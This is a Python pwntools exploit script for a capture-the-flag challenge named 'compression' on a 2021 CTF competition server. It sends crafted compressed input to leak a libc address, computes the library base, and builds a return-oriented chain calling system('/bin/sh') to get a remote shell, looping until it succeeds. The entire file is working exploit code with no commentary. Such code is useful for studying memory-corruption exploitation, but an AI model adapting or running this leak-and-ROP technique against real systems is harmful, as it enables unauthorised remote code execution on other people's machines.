#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'compression.2021.ctfcompetition.com', 1337
binary = './compmod'
brkpts = '''
b *0x555555555840
b *0x555555555973
b *0x55555555536d
c
'''

elf = ELF("compress")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))
def exploit(io):
    sla("\n\n", "2")
    header = "54494e59"
    footer = "ff0000"
    payload = header + "ffa85606" + "a651" + "ff028020" + "ffe06730" + "ffb22002" + "ffd06604" + footer
    sla("(max 4k):\n", payload)
    reu("to:\n")
    libc_leak = ""
    for i in range(6):
        libc_leak += chr(int("0x"+re(2), 16))
    libc_leak = uu64(libc_leak)
    log.info("leak @ "+hex(libc_leak))
    base = libc_leak - 0x1ec4a0
    libc.address = base
    system = libc.symbols['system']
    binsh = next(libc.search("/bin/sh"))
    ret = base + 0x25679
    pop_rdi = base + 0x26b72
    gadget = base + [0xe6c7e, 0xe6c81, 0xe6c84, 0xe6e73, 0xe6e76][1]
    sla("\n\n", "2")
    
    payload = flat([pop_rdi, binsh, ret, system])
    p = ""
    for i in range(len(payload)):
        if i & 7 == 0 and i != 0:
            p += "00"
        p += hex(ord(payload[i])).replace("0x", "")
    p += "00"

    payload = header + p + "ff10e81f" + "ffe06730" + "ffb82032" + footer
    sla("(max 4k):\n", payload)

    io.interactive()

if __name__ == "__main__":
    while True:
        try:
            io = remote(remote_ip, port)
            # io = process(binary, env = {"LD_PRELOAD" : "./libc.so.6"})
            exploit(io)
        except:
            io.close()
            continue
